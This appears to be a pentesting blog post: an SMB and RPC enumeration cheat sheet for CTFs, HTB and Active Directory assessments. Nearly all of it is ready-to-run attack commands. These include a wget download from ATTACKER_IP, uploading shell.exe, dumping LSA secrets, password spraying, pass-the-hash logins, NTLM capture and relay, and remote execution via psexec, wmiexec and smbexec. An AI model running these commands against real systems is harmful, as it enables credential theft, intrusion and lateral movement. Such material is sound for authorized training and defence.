---
layout: post
title: "SMB & RPC Enumeration Cheatsheet"
subtitle: "Fast SMB, RPC and Windows service enumeration for HTB, CTFs and real-world AD pentests"
tags: [smb, rpc, windows, enumeration, htb, ctf, impacket]
---

A practical cheat sheet for SMB, RPC and Windows service enumeration during HTB, CTFs and Active Directory pentesting.

---

# 0. ESSENTIAL SMB & RPC ENUMERATION TOOLS

## Core Tools
- **smbclient** (Samba CLI)
- **smbmap**: https://github.com/ShawnDEvans/smbmap  
- **enum4linux-ng**: https://github.com/cddmp/enum4linux-ng  
- **CrackMapExec (CME)**: https://github.com/Porchetta-Industries/CrackMapExec  
- **Impacket suite**: https://github.com/fortra/impacket  
  - `psexec.py`, `wmiexec.py`, `smbexec.py`, `samrdump.py`, `lookupsid.py`, etc.
- **Evil-WinRM**: https://github.com/Hackplayers/evil-winrm  
- **rpcclient** (Linux built-in)
- **Responder** (for SMB/NTLM relay scenarios)

## Quick File Transfer (attacker → victim)
```

python3 -m http.server 8000
wget http://ATTACKER_IP:8000/tool.exe

```

---

# 1. BASIC SMB ENUMERATION

## Check if SMB is open
```

nmap -p445 --script=smb-enum* TARGET

```

## List shares anonymously
```

smbclient -L //TARGET/ -N

```

## Connect to a share
```

smbclient //TARGET/SHARE -N

```

## Recursively download files
```

smbclient //TARGET/SHARE -N -c "recurse ON; prompt OFF; mget *"

```

---

# 2. SMBMAP (POWERFUL SHARE ENUMERATION)

## Full enum anonymous
```

smbmap -H TARGET

```

## Check permissions
```

smbmap -H TARGET -u '' -p ''

```

## Authenticated access
```

smbmap -H TARGET -u user -p password

```

## Upload a file
```

smbmap -H TARGET -u user -p pass --upload '/tmp/shell.exe' 'C$\temp\shell.exe'

```

## Download a file
```

smbmap -H TARGET --download 'SHARE\path\file.txt'

```

---

# 3. ENUM4LINUX-NG (MODERN REPLACEMENT)

## Full enumeration
```

enum4linux-ng -A TARGET

```

## Basic info
```

enum4linux-ng TARGET

```

Outputs:
- Users  
- Groups  
- Shares  
- Policies  
- Password lockout info  
- Domain/Workgroup  

---

# 4. RPCCLIENT (LOW-LEVEL RPC ENUMERATION)

## Anonymous login
```

rpcclient -U "" -N TARGET

```

### Common RPC commands
```

enumdomusers
enumdomgroups
queryuser <RID>
querygroup <RID>
getusername
lookupnames <user>
lookupsids <sid>

```

### RID Cycling (user discovery)
```

rpcclient -U "" -N TARGET -c "enumdomusers"

```

---

# 5. IMPACKET SMB/RPC ENUMERATION SCRIPTS

## SID lookups
```

lookupsid.py ''@TARGET

```

## SAMR dump
```

samrdump.py TARGET

```

## List shares
```

smbclient.py domain/user:pass@TARGET

```

## Dump LSA secrets
```

secretsdump.py domain/user:pass@TARGET

```

## Netlogon checks
```

rpcdump.py TARGET

```

---

# 6. CRACKMAPEXEC (CME) — MASS ENUM + SPRAY

## Basic scan
```

crackmapexec smb TARGET

```

## Enumerate shares
```

crackmapexec smb TARGET --shares

```

## Password spray
```

crackmapexec smb TARGET -u users.txt -p 'Password123!'

```

## Enumerate sessions
```

crackmapexec smb TARGET --sessions

```

## Execute command via SMB (if credentials work)
```

crackmapexec smb TARGET -u user -p pass -x whoami

```

---

# 7. WINRM ACCESS (EVIL-WINRM)

Used when port 5985/5986 is open.

## Basic connection
```

evil-winrm -i TARGET -u user -p password

```

## Using a hash
```

evil-winrm -i TARGET -u user -H <NTLM_HASH>

```

## Upload files
```

upload /path/to/file.exe

```

## Execute PowerShell scripts
```

evil-winrm > powershell.exe -ExecutionPolicy Bypass -File script.ps1

```

---

# 8. SMB AUTH OVER RELAY / NTLM

## Start Responder to capture NTLMv2 hashes
```

responder -I eth0

```

## Relay to SMB
```

ntlmrelayx.py -t smb://TARGET --exec whoami

```

## Relay to LDAP (create new machine)
```

ntlmrelayx.py -t ldap://DC_IP --add-computer

```

---

# 9. FINDING INTERESTING SHARES

### Default shares to inspect
- `C$` (admin only)
- `ADMIN$`
- `IPC$`
- `SYSVOL`  
- `NETLOGON`  
- `Shared`  
- `Public`

### SYSVOL / NETLOGON often expose:
- GPO scripts  
- Passwords in `Groups.xml`  
- Startup scripts  
- Unencrypted credentials  

## Download SYSVOL
```

smbclient //DC/SYSVOL -U user -c "prompt OFF; recurse ON; mget *"

```

---

# 10. SMB SIGNING CHECK

## Nmap script
```

nmap -p445 --script=smb-security-mode TARGET

```

If **SMB signing: disabled**, it’s vulnerable to relay.

---

# 11. SMB EXECUTION VIA IMPACKET

## psexec (classic)
```

psexec.py domain/user:pass@TARGET

```

## smbexec (file-less)
```

smbexec.py domain/user:pass@TARGET

```

## wmiexec (stealth)
```

wmiexec.py domain/user:pass@TARGET

```

---

# 12. COMMON SMB PATHS & MISCONFIGURATIONS

## Writable shares
Look for:
- `/upload`
- `/public`
- `/tmp`
- `/dev`
- Custom shares with modify permissions

Upload webshell or malicious script → trigger execution.

## Password reuse
SMB credentials often unlock other services:
- WinRM  
- RDP  
- MSSQL  
- LDAP bind  
- Kerberoasting  

---

# Final Notes

This cheat sheet covers the essential enumeration and exploitation techniques for SMB and RPC:

* Anonymous share access  
* Share and file enumeration  
* User/group/SID discovery  
* RID cycling  
* CrackMapExec automation  
* Impacket RPC utilities  
* Evil-WinRM for remote shells  
* SMB Relay preparation  
* Access to SYSVOL and NETLOGON  
* SMB execution (psexec, smbexec, wmiexec)  

Useful for HTB, OSCP/OSWP, AD pentesting and real-world Windows environments.

---